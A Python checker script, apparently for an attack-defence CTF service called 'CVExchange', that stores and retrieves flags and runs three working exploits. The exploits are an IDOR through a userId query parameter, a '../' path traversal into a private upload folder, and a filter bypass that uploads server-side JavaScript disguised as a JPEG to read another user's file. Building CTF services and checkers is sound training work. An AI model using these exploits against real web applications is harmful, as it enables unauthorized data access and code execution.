from typing import Optional #type checking / optional parameters i.e. a function may or may not return a str
from httpx import AsyncClient #client for http requests
from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    ExploitCheckerTaskMessage,
    InternalErrorException
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
from bs4 import BeautifulSoup
import random
import string
import base64


checker = Enochecker("CVExchange", 1337)


@checker.putflag(0)
async def putflag_note(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:

    # register so client has a cookie 
    name, password = ''.join(random.choices(string.ascii_letters + string.digits, k=10)), ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    email = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '@' + ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    registerResp = await client.post("/user/register", json={"name": name, "email": email, "password": password})
    assert_equals(registerResp.status_code, 302, "couldn't register a new user under /user/register")
    
    # deposit the flag as the users personal note
    uploadResp = await client.post("/user/editnote", json={"text": task.flag})
    assert_equals(uploadResp.status_code, 302, "couldn't store flag under /user/editnote")
    await db.set("userinfo", (email, password) )


@checker.putflag(1)
async def putflag_private(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
   
    # register so client has a cookie 
    name, password = ''.join(random.choices(string.ascii_letters + string.digits, k=10)), ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    email = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '@' + ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    registerResp = await client.post("/user/register", json={"name": name, "email": email, "password": password})
    assert_equals(registerResp.status_code, 302, "couldn't register a new user under /user/register")

    # create a .txt file containing the flag and upload it to /files/private
    with open('flag.txt', 'w') as flagFile:
        flagFile.write(task.flag)

    uploadResp = await client.post('/files/private', data={"file": open('flag.txt', 'rb')})
    assert_equals(uploadResp.status_code, 302, "couln't store flag under /files/private")
    await db.set("userinfo", (email, password))

@checker.putflag(2)
async def putflag_backup(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
   
    # register so client has a cookie 
    name, password = ''.join(random.choices(string.ascii_letters + string.digits, k=10)), ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    email = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '@' + ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    registerResp = await client.post("/user/register", json={"name": name, "email": email, "password": password})
    assert_equals(registerResp.status_code, 302, "couldn't register a new user under /user/register")

    # create a .txt file containing the flag and upload it to /files/backup
    with open('flag.txt', 'w') as flagFile:
        flagFile.write(task.flag)

    uploadResp = await client.post('/files/backup', data={"file": open('flag.txt', 'rb')})
    assert_equals(uploadResp.status_code, 302, "couln't store flag under /files/backup")
    await db.set("userinfo", (email, password))


@checker.getflag(0)
async def getflag_note(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:

    # retrieve login data from the DB
    try:
        email, password = await db.get("userinfo")
    except KeyError:
        raise MumbleException("couldn't retrieve userinfo from DB")
    
    # login with registration data from putflag(0)
    loginResp = await client.post("/user/login", json={"email": email, "password": password})
    assert_equals(loginResp.status_code, 302, "couldn't login with userdata from putflag(0)")
    
    # scour the frontpage to retrieve our unique userId
    try:
        profileResp = await client.get("/") 
        html = BeautifulSoup(profileResp, "html.parser")
        userClass = html.find('span', attrs={'class':'user'})
        profileLink = userClass.find('a')
        userId = profileLink['href'].split('/')[-1]
    except:
        raise MumbleException("something went wrong while parsing the userId")

    # now that we have the userId we visit our profile page and find the flag
    flagResp = await client.get(f"/user/profile/{userId}")
    assert_equals(flagResp.status_code, 200, "couldn't get profile page containing the flag")
    assert_in(task.flag, flagResp.text, "flag not found on profile page")


@checker.getflag(1)
async def getflag_private(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    
    # retrieve login data from the DB
    try:
        email, password = await db.get("userinfo")
    except KeyError:
        raise MumbleException("couldn't retrieve userinfo from DB")
    
    # login with registration data from putflag(1)
    loginResp = await client.post("/user/login", json={"email": email, "password": password})
    assert_equals(loginResp.status_code, 302, "couldn't login with userdata from putflag(1)")
    
    # scour the frontpage to retrieve our unique userId
    try:
        profileResp = await client.get("/") 
        html = BeautifulSoup(profileResp, "html.parser")
        userClass = html.find('span', attrs={'class':'user'})
        profileLink = userClass.find('a')
        userId = profileLink['href'].split('/')[-1]
    except:
        raise MumbleException("something went wrong while parsing the userId")
    
    # visit the users private upload directory to find the flag 
    flagResp = await client.get(f"/uploads/{base64.b64encode(userId.encode()).decode()}/private/flag.txt")
    assert_equals(flagResp.status_code, 200, "couldn't retrieve the flag from private directory")
    assert_in(task.flag, flagResp.text, "flag not found in private directory")


@checker.getflag(2)
async def getflag_backup(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    
    # retrieve login data from the DB
    try:
        email, password = await db.get("userinfo")
    except KeyError:
        raise MumbleException("couldn't retrieve userinfo from DB")
    
    # login with registration data from putflag(2)
    loginResp = await client.post("/user/login", json={"email": email, "password": password})
    assert_equals(loginResp.status_code, 302, "couldn't login with userdata from putflag(1)")
    
    # scour the frontpage to retrieve our unique userId
    try:
        profileResp = await client.get("/") 
        html = BeautifulSoup(profileResp, "html.parser")
        userClass = html.find('span', attrs={'class':'user'})
        profileLink = userClass.find('a')
        userId = profileLink['href'].split('/')[-1]
    except:
        raise MumbleException("something went wrong while parsing the userId")
    
    # visit the users backup directory to retrieve the flag
    flagResp = await client.get(f"/files/retrieve/{base64.b64encode(userId.encode()).decode()}/flag.txt")
    assert_equals(flagResp.status_code, 200, "couldn't retrieve the flag from backup directory")
    assert_in(task.flag, flagResp.text, "flag not found in backup directory")


@checker.exploit(0)
async def exploit_note(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:

    # retrieve userId from attackinfo
    if(task.attack_info == ""):
        raise InternalErrorException("Attack info is empty")
    userId = task.attack_info

    # register so client has a cookie 
    name, password = ''.join(random.choices(string.ascii_letters + string.digits, k=10)), ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    email = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '@' + ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    registerResp = await client.post("/user/register", json={"name": name, "email": email, "password": password})
    assert_equals(registerResp.status_code, 302, "couldn't register a new user under /user/register")

    # exploit
    flagResp = await client.get(f"/user/profile/{userId}?userId={userId}")
    assert_equals(flagResp.status_code, 200, "couldn't load profile page with flag")

    # retrieve and return the flag
    if flag := searcher.search_flag(flagResp.text):
        return flag


@checker.exploit(1)
async def exploit_private(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:

    # retrieve userId from attackinfo
    if(task.attack_info == ""):
        raise InternalErrorException("Attack info is empty")
    userId = task.attack_info

    # register so client has a cookie 
    name, password = ''.join(random.choices(string.ascii_letters + string.digits, k=10)), ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    email = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '@' + ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    registerResp = await client.post("/user/register", json={"name": name, "email": email, "password": password})
    assert_equals(registerResp.status_code, 302, "couldn't register a new user under /user/register")

    # exploit
    flagResp = await client.get(f"/uploads/{base64.b64encode(userId.encode()).decode()}/public/../private/flag.txt")
    assert_equals(flagResp.status_code, 200, "couldn't load flag from private directory")

    # retrieve and return the flag
    if flag := searcher.search_flag(flagResp.text):
        return flag
    

@checker.exploit(2)
async def exploit_backup(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:

    # retrieve userId from attackinfo
    if(task.attack_info == ""):
        raise InternalErrorException("Attack info is empty")
    victimUserId = task.attack_info

    # register so client has a cookie 
    name, password = ''.join(random.choices(string.ascii_letters + string.digits, k=10)), ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    email = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '@' + ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    registerResp = await client.post("/user/register", json={"name": name, "email": email, "password": password})
    assert_equals(registerResp.status_code, 302, "couldn't register a new user under /user/register")

    # scour the frontpage to retrieve our unique userId
    try:
        profileResp = await client.get("/") 
        html = BeautifulSoup(profileResp, "html.parser")
        userClass = html.find('span', attrs={'class':'user'})
        profileLink = userClass.find('a')
        userId = profileLink['href'].split('/')[-1]
    except:
        raise MumbleException("something went wrong while parsing the userId")

    # create a file containing js that will be executed on server side to reveal the users flag
    with open('getflag.jpg.js', 'w') as getFlag:
        getFlag.write(f"""const fs = require('fs');
                            const path = require('path'); 
                            const flagPath = path.join(__dirname, '../backups', '{base64.b64encode(victimUserId.encode()).decode()}', 'flag.txt');
                            function readFlagFile() {{
                                try {{
                                    const flag = fs.readFileSync(flagPath, 'utf8');
                                    return flag;
                                }} catch (error) {{
                                    return 'Failed to read flag file';
                                }}
                            }}
                            const result = readFlagFile();
                            result;""" )
    
    # upload the file to our public upload directory, bypassing server side filters
    uploadResp = await client.post('/files/upload', headers={'Content-Type': 'image/jpeg'}, data={"file": open('getflag.jpg.js', 'rb')})
    assert_equals(uploadResp.status_code, 200, "couldn't upload exploit to /files/upload")

    # the file gets evaluated on server side and we should get the flag in the response
    flagResp = await client.get(f"/uploads/{base64.b64encode(userId.encode()).decode()}/public/getflag.jpg.js")
    assert_equals(flagResp.status_code, 200, "couldn't retrieve flag from /uploads/:userId/public/getflag.jpg.js")

    # retrieve and return the flag
    if flag := searcher.search_flag(flagResp.text):
        return flag